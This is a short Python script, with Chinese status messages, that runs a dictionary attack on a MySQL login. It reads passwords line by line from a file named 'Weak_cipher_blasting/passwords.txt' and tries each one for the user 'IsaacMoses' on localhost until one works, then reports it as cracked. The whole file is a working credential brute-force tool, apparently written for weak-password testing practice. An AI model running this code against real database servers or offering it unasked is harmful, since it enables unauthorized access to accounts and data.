import pymysql


def test_password(password):
    try:
        conn = pymysql.connect(host='localhost', user='IsaacMoses', password=password)
        print('[*] 密码破解成功，密码为：{}'.format(password))
        conn.close()
        return True
    except:
        print('[-] 密码{}破解失败'.format(password))
        return False


def main():
    pwd_list = []
    with open('Weak_cipher_blasting/passwords.txt', 'r') as f:
        for line in f:
            pwd_list.append(line.strip())
    for password in pwd_list:
        if test_password(password):
            break


# if __name__ == '__main__':
#     main()
